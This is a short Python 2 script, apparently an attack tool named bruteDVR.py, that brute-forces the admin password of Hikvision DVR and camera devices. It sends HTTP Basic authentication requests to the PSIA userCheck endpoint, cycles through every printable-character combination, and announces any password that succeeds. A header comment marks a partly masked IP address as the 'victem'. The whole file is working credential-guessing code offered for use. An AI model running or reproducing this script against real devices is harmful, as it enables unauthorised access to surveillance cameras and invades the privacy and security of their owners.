#!/usr/bin/env python
#http://190.x.x.x/PSIA/Custom/SelfExt/userCheck (victem)
#Dictionary attack for DVR - camara HIKVision
#Use: ./bruteDVR.py url -d
import urllib2,sys,base64,time
import string 

USERNAME='admin'
ALLOWED_CHARACTERS = string.printable 
NUMBER_OF_CHARACTERS = len(ALLOWED_CHARACTERS) 

def characterToIndex(char):
    return ALLOWED_CHARACTERS.index(char) 

def indexToCharacter(index):
    if NUMBER_OF_CHARACTERS <= index:
        raise ValueError("Index out of range.")
    else:
        return ALLOWED_CHARACTERS[index] 
def next(string):
    if len(string) <= 0:
        string.append(indexToCharacter(0))
    else:
        string[0] = indexToCharacter((characterToIndex(string[0]) + 1) % NUMBER_OF_CHARACTERS)
        if characterToIndex(string[0]) is 0:
            return list(string[0]) + next(string[1:])
    return string 

def d_attack(line):
	passwd=""
	url = sys.argv[1]		
	req = urllib2.Request(url)		
	req.add_header('Cache-Control','max-age=0')
	#req.add_header('Connection','keep-alive')	
	req.add_header('Connection','close')	
	req.add_header('host',url.split('/')[2])
	aut = 'Basic ' + base64.b64encode(USERNAME + ':' + line.strip('\n'))		
	req.add_header('Authorization',aut)
	response = urllib2.urlopen(req)		
	html = str(response.read())
	print html + ' line: ' + line
	if html.find('200') >0:
		passwd = line.strip('\n')
		if len(passwd)>0:
			print "[+] Haleluja, password is: " + passwd
			sys.exit()
		
	time.sleep(0.079)
			
#try:
if len(sys.argv)==3:		
	if sys.argv[2]=='-d':
		sequence = list()
	while True:
		text = ""
		sequence = next(sequence)
		for item in sequence:
			text += item			
		d_attack(text)	
else:
	print "Sistax Error"	
	print "shud be like this:"	
	print "-"*60
	print "./bruteDVR.py url -d"
	print "-"*60
"""
except:
	print "You exit by your self.."
	sys.exit()
"""			
			
			
			
			
	
	
